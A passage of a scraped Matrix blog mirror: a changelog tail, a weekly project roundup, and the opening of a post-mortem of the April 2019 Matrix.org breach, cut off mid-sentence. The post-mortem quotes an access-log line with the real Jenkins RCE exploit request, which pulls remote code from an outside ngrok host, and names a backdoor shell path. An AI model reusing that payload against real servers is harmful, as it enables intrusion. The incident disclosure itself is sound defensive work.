<li>Improve logging when event-signature checks fail. (<a href="https://github.com/matrix-org/synapse/issues/5100">#5100</a>)</li>
<li>Factor out an &quot;assert_requester_is_admin&quot; function. (<a href="https://github.com/matrix-org/synapse/issues/5120">#5120</a>)</li>
<li>Remove the requirement to authenticate for /admin/server_version. (<a href="https://github.com/matrix-org/synapse/issues/5122">#5122</a>)</li>
<li>Prevent an exception from being raised in a IResolutionReceiver and use a more generic error message for blacklisted URL previews. (<a href="https://github.com/matrix-org/synapse/issues/5155">#5155</a>)</li>
<li>Run <code>black</code> on the tests directory. (<a href="https://github.com/matrix-org/synapse/issues/5170">#5170</a>)</li>
<li>Fix CI after new release of isort. (<a href="https://github.com/matrix-org/synapse/issues/5179">#5179</a>)</li>
</ul>

        </div>
    </article>
    
    <article class="post">
        <header>
            <h1><a href="https:&#x2F;&#x2F;matrix.turbo.fish&#x2F;blog&#x2F;2019&#x2F;05&#x2F;10&#x2F;this-week-in-matrix-2019-05-10&#x2F;" title="This Week in Matrix 2019-05-10">This Week in Matrix 2019-05-10</a></h1>
            <span>
                10.05.2019 00:00
                ‚Äî
                <a href="/category/this-week-in-matrix">
                    This Week in Matrix
                </a>
                ‚Äî
                
                <a href="/author/ben-parsons">
                    Ben Parsons
                </a>
                
            </span>
            
        </header>
        <div>
            <h2 id="matrix-live">Matrix Live</h2>
<p>This week Neil and Matthew are talking about recent security issues - this is a really long and detailed chat, but you can skip to around the 32 minute mark to hear about other news - including progress on reactions. Reminder that for a good &quot;big picture&quot; overview of the progress of Matrix, you can look at the <a href="https://github.com/orgs/matrix-org/projects/9">Homeserver High Level Roadmap</a>.</p>
<iframe src="https://www.youtube.com/embed/vSCfoQTVOE8" frameBorder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowFullScreen></iframe>
<h2 id="dept-of-servers">Dept of Servers</h2>
<h3 id="synapse">Synapse</h3>
<p>Neil, Synapse-dev wrangler:</p>
<blockquote>
<p>Reactions continues at full speed, we have a draft PR and will be implementing over the coming week. The ability to blacklist IPs over federation will land imminently, as well as a nasty device management bug that led to a spate of E2E errors. Next week is all about Reactions, resuming work on the small homeserver project and finally getting back to Synapse 1.0 blockers following all the remediation drama of the past few weeks. With any luck we‚Äôll have a new Synapse release for you next week.</p>
</blockquote>
<h2 id="dept-of-encryption">Dept of Encryption</h2>
<h3 id="pantalaimon">Pantalaimon</h3>
<p>Says <a href="https://github.com/poljar">poljar</a>:</p>
<blockquote>
<ul>
<li><a href="https://github.com/matrix-org/pantalaimon">Pantalaimon</a> received a configuration file. The configuration file adds the ability to configure multiple Homeservers and pantalaimon will run having each Homeserver exposed on a different TCP port.</li>
<li>The panctl utility has received support for more commands, it now has the ability to accept SAS requests, confirm them, import/export keys, list pan users as well as list devices of users. Completions for the commands were also added.</li>
</ul>
</blockquote>
<h2 id="dept-of-clients">Dept of Clients</h2>
<h3 id="pattle-big-update">Pattle - big update!</h3>
<p><a href="https://matrix.to/#/@wilko:matrix.org">Wilko</a> announced:</p>
<blockquote>
<p>A new version of Pattle is available on F-droid!</p>
<p>Lots of changes again, including:</p>
<ul>
<li>Render HTML formatting in messages!</li>
<li>Replies are now rendered!</li>
<li>Show date headers between messages of different days!</li>
<li>Render usernames with a color in chat timeline</li>
<li>Add loading indicators (when logging in, loading chats, etc.)</li>
<li>Show error banner at the top if syncing failed</li>
<li>Syncing now resumes after a failed attempt (no more restarting)</li>
<li>Fix messages not being sent if connection was lost and the app restarted</li>
</ul>
<p>To install Pattle, add the following repo in F-droid:</p>
<p><a href="https://fdroid.pattle.im/?fingerprint=E91F63CA6AE04F8E7EA53E52242EAF8779559209B8A342F152F9E7265E3EA729">https://fdroid.pattle.im/?fingerprint=E91F63CA6AE04F8E7EA53E52242EAF8779559209B8A342F152F9E7265E3EA729</a></p>
<p>Follow development <a href="https://git.pattle.im/pattle/app">here</a> and in <a href="https://matrix.to/#/#pattle:matrix.org">#pattle:matrix.org</a>!</p>
</blockquote>
<p><img src="/blog/img/pattle-2019-05-10.png" alt="" /></p>
<h3 id="fractal">Fractal</h3>
<p><a href="https://matrix.to/#/@afranke:matrix.org">Alexandre Franke</a>:</p>
<blockquote>
<p>Although the development pace has been reduced lately, the Fractal team managed to make significant progress towards the 4.2 release. More specifically since our previous news, Chris has landed much of his adaptive view work to get Fractal in a mobile friendly state so it‚Äôs ready to run on the Librem 5 once Purism starts shipping them. But he didn‚Äôt stop there: eager to see his awesome work in the hands of many people (figuratively, the literal application will have to wait for the phone to be out üòõ) as soon as possible, he tackled a few bugs that we really wanted to get sorted out before we got a new version out.</p>
<p>Alexandre also <a href="https://gitlab.gnome.org/GNOME/fractal/commit/152255031400049a30667c581c0dc31a4ef03146">prepared the changelog</a> with a bird‚Äôs-eye view of all changes that happened since 4.0.</p>
<p>Last but not least, we had a few external contributions for features such as network proxy support and typing notifications.</p>
</blockquote>
<h3 id="riot-web">Riot Web</h3>
<blockquote>
<p>Progress on message composer for editing messages.</p>
</blockquote>
<h3 id="riot-ios">Riot iOS</h3>
<blockquote>
<ul>
<li>0.8.6 has been released on Tuesday</li>
<li>We are working on reactions</li>
</ul>
</blockquote>
<h3 id="riot-android">Riot Android</h3>
<blockquote>
<ul>
<li>We have fixed some minor bugs, our efforts are now on RiotX</li>
<li>New FDroid mode support for high service level, regardless of battery usage.</li>
</ul>
</blockquote>
<h3 id="riotx-android">RiotX (Android)</h3>
<blockquote>
<ul>
<li>Benoit has started to implement the crypto on RiotX. Basically all the legacy has been imported and a migration to the new architecture is done. Lots of plumbing and rework, but it should be the fastest way to support crypto on RiotX.</li>
<li>Valere is working on the emoji picker and reactions, and has also added some actions on events (copy, share, view source, etc.)</li>
<li>Fran√ßois has added room invitation support. It will be possible soon to see invitations, and accept or reject them.</li>
</ul>
</blockquote>
<h3 id="continuum">continuum</h3>
<p><a href="https://matrix.to/#/@uforia:matrix.org">yuforia</a> has news on <a href="https://github.com/koma-im/continuum-desktop">continuum</a>, a JavaFX-based client.</p>
<blockquote>
<p>this week in <a href="https://github.com/koma-im/continuum-desktop">continuum</a></p>
<ul>
<li>right-click on a room in the room list to send invitations</li>
<li>experimental support for receiving invitations</li>
<li>membership data are now also persisted in database</li>
</ul>
</blockquote>
<h3 id="fluffychat-available-as-a-snap-package-plus-e2ee-progress">FluffyChat available as a Snap package, plus E2EE progress</h3>
<p><a href="https://matrix.to/#/@krille:chat.regionetz.net">Krille</a> announced FluffyChat for Linux desktops:</p>
<blockquote>
<p>FluffyChat is now also available as a Snap package for desktop Linux<br />
<a href="https://snapcraft.io/fluffychat">https://snapcraft.io/fluffychat</a> :D<br />
It's a Matrix client written in Qml for Ubuntu Phones. Now it is working for Linux Desktop too.</p>
</blockquote>
<p>He also has news to share re E2E:</p>
<blockquote>
<p>Progress has been made at the end2end encryption for FluffyChat. Qml bindings for the libolm library are mostly ready and the app can now create keys and upload keys to the server. Device tracking is now implemented too.</p>
</blockquote>
<p>E2E when? SOON! See the branch here: https://gitlab.com/ChristianPauly/fluffychat/tree/e2eencryption</p>
<h2 id="dept-of-bridges">Dept of Bridges</h2>
<h3 id="new-hangouts-bridge-from-tulir-mautrix">New Hangouts bridge from tulir / mautrix</h3>
<p><a href="https://matrix.to/#/@tulir:maunium.net">tulir</a> has been using his <a href="https://github.com/tulir/mautrix-python">mautrix-python</a> lib, which was recently used to enable his <a href="https://github.com/tulir/mautrix-facebook">mautrix-facebook</a> bridge, to bring a new method for Matrix-Hangouts bridging:</p>
<blockquote>
<p>New bridge again, this time it's Hangouts: https://github.com/tulir/mautrix-hangouts / <a href="https://matrix.to/#/#hangouts:maunium.net">#hangouts:maunium.net</a>. As with the Messenger bridge, currently the main difference to matrix-puppet-hangouts is multi-user support (also no hacky JS/Python mixing).</p>
<p>Before making mautrix-hangouts, I put a bunch of the generic bridging parts of mautrix-facebook into mautrix-python's bridge module and used that in both bridges. After Debian 10 is released, I'll drop Python 3.5 compatibility in mautrix-telegram and move it to use mautrix-python and the bridge module too.</p>
<p>Next week I'm planning on adding a bunch of features to both my new bridges, such as bridging formatting and remaining media types (so no new bridges planned for now :D).</p>
</blockquote>
<h2 id="dept-of-sdks-and-frameworks">Dept of SDKs and Frameworks</h2>
<h3 id="qmatrixclient-is-now-quotient">QMatrixClient is now &quot;Quotient&quot;</h3>
<p><a href="https://matrix.to/#/@kitsune:matrix.org">kitsune</a>:</p>
<blockquote>
<p>The vote on a new name for the QMatrixClient project has been going on over the past week.<br />
<strong>We have a winner now, and the new name is &quot;Quotient&quot;!</strong> In the nearest weeks, expect changes in the library code (it's going to be libQuotient from the next release), room aliases (already ongoing), links to the repos etc. etc. Where possible, we're going to smoothen the migration path by providing legacy fallbacks (e.g., the new C++ namespace, Quotient, will be introduced but the old one, QMatrixClient, will stay its synonym, although deprecated).<br />
Just in case you missed all the previous mentions of the topic - it's only related to the overall project and the library, but not the client - its name remains Quaternion.</p>
</blockquote>
<p>Why rename?</p>
<blockquote>
<p>Because the previous name has been a bit clumsy and, most importantly, the project is no more focusing just on client-side but on a wider set of applications of Matrix (no homeserver in plans though). See also the recent backlog of <a href="https://matrix.to/#/#qmatrixclient:matrix.org">#qmatrixclient:matrix.org</a> (now also <a href="https://matrix.to/#/#quotient:matrix.org">#quotient:matrix.org</a>) earlier this week for the whole discussion</p>
</blockquote>
<h3 id="ruby-matrix-sdk-hits-v0-1-0">Ruby Matrix SDK hits v0.1.0</h3>
<p><a href="https://github.com/ananace/">Ananace</a>:</p>
<blockquote>
<p>Just published version 0.1.0 of the <a href="https://github.com/ananace/ruby-matrix-sdk">Ruby Matrix SDK</a>, and I've gotten enough testing written now where I feel comfortable not marking this as a pre-production release. So feel free to integrate it into more than just prototypes and experiments. üòÉ<br />
Relevant links; <a href="https://github.com/ananace/ruby-matrix-sdk">GitHub page</a>, <a href="https://matrix.to/#/#ruby-matrix-sdk:kittenface.studio">#ruby-matrix-sdk:kittenface.studio</a>.</p>
</blockquote>
<h3 id="opsdroid-big-updates-with-focus-on-matrix">Opsdroid big updates, with focus on Matrix</h3>
<p><a href="https://matrix.to/#/@cadair:cadair.com">Cadair</a>:</p>
<blockquote>
<p><a href="http://opsdroid.readthedocs.io/">Opsdroid</a> 0.15 has been released, with <em>a lot</em> of matrix focused updates. The biggest of which is support for sending and receiving images and files. There have also been a bunch of bug fixes such as clean exit of the matrix connector and correct handling of events which are not parsed. There are also a bunch of other not matrix specific changes like support for the awesome <a href="https://pypi.org/project/parse/">parse</a> library for string matching. Read all about it in the release blog: https://medium.com/opsdroid/event-dispatching-simple-parsing-and-more-in-v0-15-3f721b8a6d6c</p>
</blockquote>
<h3 id="pk-interfaces-for-ruby-olm">PK interfaces for ruby_olm</h3>
<p><a href="https://matrix.to/#/@willem:canarymod.net">Willem</a>:</p>
<blockquote>
<p>This week I've been adding PK interfaces to <a href="https://github.com/cjhdev/ruby_olm">cjhdev's Ruby bindings for Olm</a>, in preparation of improving <a href="https://git.snt.utwente.nl/14mRh4X0r/tchap-proxy">my Tchap proxy</a>. The PK interfaces can be found in <a href="https://github.com/14mRh4X0r/ruby_olm">my fork of ruby_olm</a>. Building the native extensions for the gem has had a major overhaul, so no pull request yet.</p>
</blockquote>
<h2 id="dept-of-ops">Dept of Ops</h2>
<h3 id="matrix-docker-ansible-deploy-update">matrix-docker-ansible-deploy update</h3>
<p>It's been a few weeks since we heard from <a href="https://matrix.to/#/@slavi:devture.com">Slavi</a> about <a href="https://github.com/spantaleev/matrix-docker-ansible-deploy">matrix-docker-ansible-deploy</a>, but he's been working away on it:</p>
<blockquote>
<p>We haven't shared any <a href="https://github.com/spantaleev/matrix-docker-ansible-deploy">matrix-docker-ansible-deploy</a> updates lately, but we've had lots of community contributions.</p>
<p>Most of it has been bug fixes and various internal improvements, but we've also landed a few large features.
Here's what's most interesting lately:</p>
<ul>
<li><a href="https://github.com/spantaleev/matrix-docker-ansible-deploy/blob/master/docs/configuring-playbook-bridge-mautrix-facebook.md">Facebook bridging support</a> via <a href="https://github.com/tulir/mautrix-facebook">mautrix-facebook</a></li>
<li><a href="https://github.com/spantaleev/matrix-docker-ansible-deploy/blob/master/docs/configuring-playbook-mxisd.md#mxisd-controlled-registration">Support for mxisd-controlled user Registration</a></li>
<li><a href="https://github.com/spantaleev/matrix-docker-ansible-deploy/blob/master/CHANGELOG.md#caddy-webserver-examples">Examples</a> for how to use a <a href="https://caddyserver.com/">Caddy webserver</a> instead of the integrated nginx webserver</li>
<li><a href="https://github.com/spantaleev/matrix-docker-ansible-deploy/blob/master/CHANGELOG.md#goofys-support-for-other-s3-compatible-object-stores">Goofys support for other S3-compatible object stores</a></li>
</ul>
</blockquote>
<h2 id="dept-of-status-of-matrix">Dept of <em>Status of Matrix</em></h2>
<p><a href="https://matrix.to/#/@jaywink:feneas.org">jaywink</a>, maintainer of <a href="https://the-federation.info">https://the-federation.info</a>, told us what we all know to be true: Matrix is great and is getting more popular:</p>
<blockquote>
<p>Matrix (Synapse) jumps to second place in <a href="https://the-federation.info">https://the-federation.info</a> site, which lists servers of the federated social web. Help us map the true size of the Matrixverse by adding your server by going a <code>https://the-federation.info/register/yourdomain.tld</code>. Note, SRV and well-known lookups not yet working, so registration needs to happen with the Matrix server real domain (and port if any).</p>
</blockquote>
<h2 id="that-s-all-i-know">That's all I know</h2>
<p>See you next week, and be sure to stop by <a href="https://matrix.to/#/#TWIM:matrix.org">#twim:matrix.org</a> with your updates!</p>
<p>PS to people who would normally be reading this in their own RSS reader - I apologise, we'll get the full-article feed back up soon.</p>

        </div>
    </article>
    
    <article class="post">
        <header>
            <h1><a href="https:&#x2F;&#x2F;matrix.turbo.fish&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;" title="Post-mortem and remediations for Apr 11 security incident">Post-mortem and remediations for Apr 11 security incident</a></h1>
            <span>
                08.05.2019 00:00
                ‚Äî
                <a href="/category/general">
                    General
                </a>
                ‚Äî
                
                <a href="/author/matthew-hodgson">
                    Matthew Hodgson
                </a>
                
            </span>
            
        </header>
        <div>
            <h3 id="table-of-contents">Table of contents</h3>
<ul>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#introduction">Introduction</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#history">History</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#the-incident">The Incident</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#the-defacement">The Defacement</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#the-rebuild">The Rebuild</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#remediations">Remediations</a>
<ul>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh">SSH</a>
<ul>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh-agent-forwarding-should-be-disabled">SSH agent forwarding should be disabled.</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh-should-not-be-exposed-to-the-general-internet">SSH should not be exposed to the general internet</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh-keys-should-give-minimal-access">SSH keys should give minimal access</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#two-factor-authentication">Two factor authentication</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#it-should-be-made-as-hard-as-possible-to-add-malicious-ssh-keys">It should be made as hard as possible to add malicious SSH keys</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#changes-to-ssh-keys-should-be-carefully-monitored">Changes to SSH keys should be carefully monitored</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh-config-should-be-hardened-disabling-unnecessary-options">SSH config should be hardened, disabling unnecessary options</a></li>
</ul>
</li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#network-architecture">Network architecture</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#keeping-patched">Keeping patched</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#intrusion-detection">Intrusion detection</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#incident-management">Incident management</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#configuration-management">Configuration management</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#avoiding-temporary-measures-which-last-forever">Avoiding temporary measures which last forever</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#secure-packaging">Secure packaging</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#dev-and-ci-infrastructure">Dev and CI infrastructure</a></li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#log-minimisation-and-handling-personally-identifying-information-pii">Log minimisation and handling Personally Identifying Information (PII)</a></li>
</ul>
</li>
<li><a href="https://matrix.turbo.fish/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#conclusion">Conclusion</a></li>
</ul>
<h3 id="introduction">Introduction</h3>
<p>Hi all,</p>
<p>On April 11th we dealt with a major security incident impacting the infrastructure which runs the Matrix.org homeserver - specifically: removing an attacker who had gained superuser access to much of our production network.  We provided updates at the time as events unfolded on April 11 and 12 via <a href="https://twitter.com/matrixdotorg/status/1116304867683905537">Twitter</a> and our <a href="https://matrix.org/blog/2019/04/11/security-incident/">blog</a>, but in this post we‚Äôll try to give a full analysis of what happened and, critically, what we have done to avoid this happening again in future.  Apologies that this has taken several weeks to put together: the time-consuming process of rebuilding after the breach has had to take priority, and we also wanted to get the key remediation work in place before writing up the post-mortem.</p>
<p>Firstly, please understand that <strong>this incident was not due to issues in the Matrix protocol itself or the wider Matrix network</strong> - and indeed everyone who wasn‚Äôt on the Matrix.org server should have barely noticed.  If you see someone say ‚ÄúMatrix got hacked‚Äù, please politely but firmly explain to them that the servers which run the oldest and biggest instance got compromised via a Jenkins vulnerability and bad ops practices, but <strong>the protocol and network itself was not impacted</strong>.  This is not to say that the Matrix protocol itself is bug free - indeed we are still in the process of exiting beta (delayed by this incident), but <strong>this incident was not related to the protocol</strong>.</p>
<p>Before we get stuck in, we would like to apologise unreservedly to everyone impacted by this whole incident.  Matrix is an altruistic open source project, and our mission is to try to make the world a better place by providing a secure decentralised communication protocol and network for the benefit of everyone; giving users total control back over how they communicate online.</p>
<p>In this instance, our focus on trying to improve the protocol and network came at the expense of investing sysadmin time around the legacy Matrix.org homeserver and project infrastructure which we provide as a free public service to help bootstrap the Matrix ecosystem, and we paid the price.</p>
<p>This post will hopefully illustrate that we have learnt our lessons from this incident and will not be repeating them - and indeed intend to come out of this episode stronger than you can possibly imagine :)</p>
<p>Meanwhile, if you think that the world needs Matrix, <strong>please</strong> consider supporting us via <a href="https://patreon.com/matrixdotorg">Patreon</a> or <a href="http://liberapay.com/matrixdotorg">Liberapay</a>.  Not only will this make it easier for us to invest in our infrastructure in future, it also makes projects like <a href="https://github.com/matrix-org/pantalaimon">Pantalaimon</a> (E2EE compatibility for all Matrix clients/bots) possible, which are effectively being financed entirely by donations.  The funding we raised in Jan 2018 is not going to last forever, and we are currently looking into new longer-term funding approaches - for which we need your support.</p>
<p>Finally, if you happen across security issues in Matrix or matrix.org‚Äôs infrastructure, please please consider disclosing them responsibly to us as per our <a href="https://matrix.org/security-disclosure-policy/">Security Disclosure Policy</a>, in order to help us improve our security while protecting our users.</p>
<h3 id="history">History</h3>
<p>Firstly, some context about Matrix.org‚Äôs infrastructure.  The public Matrix.org homeserver and its associated services runs across roughly 30 hosts, spanning the actual homeserver, its DBs, load balancers, intranet services, website, bridges, bots, integrations, video conferencing, CI, etc.  We provide it as a free public service to the Matrix ecosystem to help bootstrap the network and make life easier for first-time users.</p>
<p>The deployment which was compromised in this incident was mainly set up back in Aug 2017 when we vacated our previous datacenter at short notice, thanks to our <a href="https://matrix.org/blog/2017/07/07/a-call-to-arms-supporting-matrix/">funding situation</a> at the time. Previously we had been piggybacking on the well-managed production datacenters of our previous employer, but during the exodus we needed to move as rapidly as possible, and so we span up a bunch of vanilla Debian boxes on <a href="https://upcloud.com">UpCloud</a>, and shifted over services as simply as we could.  We had no dedicated ops people on the project at that point, so this was a subset of the Synapse and Riot/Web dev teams putting on ops hats to rapidly get set up, whilst also juggling the daily fun of keeping the ever-growing Matrix.org server running and trying to actually develop and improve Matrix itself.</p>
<p>In practice, this meant that some corners were cut that we expected to be able to come back to and address once we had dedicated ops staff on the team.  For instance, we skipped setting up a VPN for accessing production in favour of simply SSHing into the servers over the internet.  We also went for the simplest possible config management system: checking all the configs for the services into a private git repo.  We also didn‚Äôt spend much time hardening the default Debian installations - for instance, the default image allows root access via SSH and allows SSH agent forwarding, and the config wasn‚Äôt tweaked.  This is particularly unfortunate, given our previous production OS (a customised Debian variant) had got all these things right - but the attitude was that because we‚Äôd got this right in the past, we‚Äôd be easily able to get it right in future once we fixed up the hosts with proper configuration management etc.</p>
<p>Separately, we also made the controversial decision to maintain a public-facing Jenkins instance.  We did this deliberately, despite the risks associated with running a complicated publicly available service like Jenkins, but reasoned that as a FOSS project, it is imperative that we are transparent and that continuous integration results and artefacts are available and directly visible to all contributors - whether they are part of the core dev team or not.  So we put Jenkins on its own host, gave it some macOS build slaves, and resolved to keep an eye open for any security alerts which would require an upgrade.</p>
<p>Lots of stuff then happened over the following months - we <a href="https://matrix.org/blog/2018/01/29/status-partners-up-with-new-vector-fueling-decentralised-comms-and-the-matrix-ecosystem/">secured funding</a> in Jan 2018; the French Government began talking about <a href="https://matrix.org/blog/2018/04/26/matrix-and-riot-confirmed-as-the-basis-for-frances-secure-instant-messenger-app/">switching to Matrix</a> around the same time; the pressure of getting Matrix (and Synapse and Riot) out of beta and to a stable 1.0 grew ever stronger; the challenge of handling the ever-increasing traffic on the Matrix.org server soaked up more and more time, and we started to see our first major security incidents (a major DDoS in March 2018, mitigated by shielding behind Cloudflare, and various attacks on the more beta bits of Matrix itself).</p>
<p>Good news was that funding meant that in March 2018 we were able to hire a fulltime ops specialist!  By this point, however, we had two new critical projects in play to try to ensure long-term funding for the project via New Vector, the startup formed in 2017 to hire the core team. Firstly, to build out <a href="https://modular.im">Modular.im</a> as a commercial-grade Matrix SaaS provider, and secondly, to support France in rolling out their massive Matrix deployment as a flagship example how Matrix can be used.  And so, for better or worse, the brand new ops team was given a very clear mandate: to largely ignore the legacy datacenter infrastructure, and instead focus exclusively on building entirely new, pro-grade infrastructure for Modular.im and France, with the expectation of eventually migrating Matrix.org itself into Modular when ready (or just turning off the Matrix.org server entirely, once we have account portability).</p>
<p>So we ended up with two production environments; the legacy Matrix.org infra, whose shortcomings continued to linger and fester off the radar, and separately all the new Modular.im hosts, which are almost entirely operationally isolated from the legacy datacenter; whose configuration is managed exclusively by Ansible, and have sensible SSH configs which disallow root login etc.  With 20:20 hindsight, the failure to prioritise hardening the legacy infrastructure is quite a good example of the <a href="https://fastjetperformance.com/podcasts/how-i-almost-destroyed-a-50-million-war-plane-when-display-flying-goes-wrong-and-the-normalisation-of-deviance/">normalisation of deviance</a> - we had gotten too used to the bad practices; all our attention was going elsewhere; and so we simply failed to prioritise getting back to fix them.</p>
<h3 id="the-incident">The Incident</h3>
<p>The first evidence of things going wrong was a tweet from <a href="https://twitter.com/JaikeySarraf">JaikeySarraf</a>, a security researcher who kindly reached out via DM at the end of Apr 9th to warn us that our Jenkins was outdated after stumbling across it via Google.  In practice, our Jenkins was running version 2.117 with plugins which had been updated on an adhoc basis, and we had indeed missed the security advisory (partially because most of our CI pipelines had moved to TravisCI, CircleCI and Buildkite), and so on Apr 10th we updated the Jenkins and investigated to see if any vulnerabilities had been exploited.</p>
<p>In this process, we spotted an unrecognised SSH key in <code>/root/.ssh/authorized_keys2</code> on the Jenkins build server.  This was suspicious both due to the key not being in our key DB and the fact the key was stored in the obscure <code>authorized_keys2</code> file (a legacy location from back when OpenSSH transitioned from <a href="https://searchsecurity.techtarget.com/tip/An-introduction-to-SSH2">SSH1-&gt;SSH2</a>).  Further inspection showed that 19 hosts in total had the same key present in the same place.</p>
<p>At this point we started doing forensics to understand the scope of the attack and plan the response, as well as taking snapshots of the hosts to protect data in case the attacker realised we were aware and attempted to vandalise or cover their tracks.  Findings were:</p>
<ul>
<li>The attacker had first compromised Jenkins on March 13th via an RCE vulnerability (CVE-2019-1003000 - <a href="https://www.exploit-db.com/exploits/46572">https://www.exploit-db.com/exploits/46572</a>):</li>
</ul>
<p><code>matrix.org:443 151.34.xxx.xxx - - [13/Mar/2019:18:46:07 +0000] &quot;GET /jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0A@GrabResolver(name=%27orange.tw%27,%20root=%27http://5f36xxxx.ngrok.io/jenkins/%27)%0A@Grab(group=%27tw.orange%27,%20module=%270x3a%27,%20version=%27000%27)%0Aimport%20Orange; HTTP/1.1&quot; 500 6083 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0&quot;</code></p>
<ul>
<li>This allowed them to further compromise a Jenkins slave (Flywheel, an old Mac Pro used mainly for continuous integration testing of Riot/iOS and Riot/Android). The attacker put an SSH key on the box, which was unfortunately exposed to the internet via a high-numbered SSH port for ease of admin by remote users, and placed a trap which waited for any user to SSH into the jenkins user, which would then hijack any available forwarded SSH keys to try to add the attacker‚Äôs SSH key to root@ on as many other hosts as possible.</li>
<li>On Apr 4th at 12:32 GMT, one of the Riot devops team members SSH‚Äôd into the Jenkins slave to perform some admin, forwarding their SSH key for convenience for accessing other boxes while doing so.  This triggered the trap, and resulted in the majority of the malicious keys being inserted to the remote hosts.</li>
<li>From this point on, the attacker proceeded to explore the network, performing targeted exfiltration of data (e.g. our passbolt database, which is thankfully end-to-end encrypted via GPG) seemingly targeting credentials and data for use in onward exploits, and installing backdoors for later use (e.g. a setuid root shell at <code>/usr/share/bsd-mail/shroot</code>).</li>
<li>The majority of access to the hosts occurred between Apr 4th and 6th.</li>
<li>There was no evidence of large-scale data exfiltration, based on analysing network logs.</li>
<li>There was no evidence of Modular.im hosts having been compromised.  (Modular‚Äôs provisioning system and DB did run on the old infrastructure, but it was not used to tamper with the modular instances themselves).</li>
<li>There was no evidence of the identity server databases having been compromised.</li>
<li>There was no evidence of tampering in our source code repositories.</li>
<li>There was no evidence of tampering of our distributed software packages.</li>
<li>Two more hosts were compromised on Apr 5th by similarly hijacking another developer SSH agent as the dev logged into a production server.</li>
</ul>
<p>By around 2am on Apr 11th we felt that we had sufficient visibility on the attacker‚Äôs behaviour to be able to do a first pass at evicting them by locking down SSH, removing their keys, and blocking as much network traffic as we could.</p>
<p>We then started a full rebuild of the datacenter on the morning of Apr 11th, given that the only responsible course of action when an attacker has acquired root is to salt the earth and start over afresh. This meant rotating all secrets; isolating the old hosts entirely (including ones which appeared to not have been compromised, for safety), spinning up entirely new hosts, and redeploying everything from scratch with the fresh secrets.  The process was significantly slowed down by colliding with unplanned maintenance and provisioning issues in the datacenter provider and unexpected delays spent waiting to copy data volumes between datacenters, but by 1am on Apr 12th the core matrix.org server was back up, and we had enough of a website up to publish the initial <a href="https://matrix.org/blog/2019/04/11/security-incident/">security incident blog post</a>. (This was actually static HTML, faked by editing the generated WordPress content from the old website. We opted not to transition any WordPress deployments to the new infra, in a bid to keep our attack surface as small as possible going forwards).</p>
<p>Given the production database had been accessed, we had no choice but drop all access_tokens for matrix.org, to stop the attacker accessing user accounts, causing a forced logout for all users on the server.  We also recommended all users change their passwords, given the salted &amp; hashed (4096 rounds of bcrypt) passwords had likely been exfiltrated.</p>
<p>At about 4am we had enough of the bare necessities back up and running to pause for sleep.</p>
<h3 id="the-defacement">The Defacement</h3>
<p>At around 7am, we were woken up to the news that the attacker had managed to replace the matrix.org website with a defacement (as per <a href="https://github.com/vector-im/riot-web/issues/9435">https://github.com/vector-im/riot-web/issues/9435</a>). It looks like the attacker didn‚Äôt think we were being transparent enough in our initial blog post, and wanted to make it very clear that they had access to many hosts, including the production database and had indeed exfiltrated password hashes.  Unfortunately it took a few hours for the defacement to get on our radar as our monitoring infrastructure hadn‚Äôt yet been fully restored and the normal paging infrastructure wasn‚Äôt back up (we now have emergency-emergency-paging for this eventuality).</p>
<p>On inspection, it transpired that the attacker had not compromised the new infrastructure, but had used Cloudflare to repoint the DNS for matrix.org to a defacement site hosted on Github.  Now, as part of rotating the secrets which had been compromised via our configuration repositories, we had of course rotated the Cloudflare API key (used to automate changes to our DNS) during the rebuild on Apr 11.  When you log into Cloudflare, it looks something like this...</p>
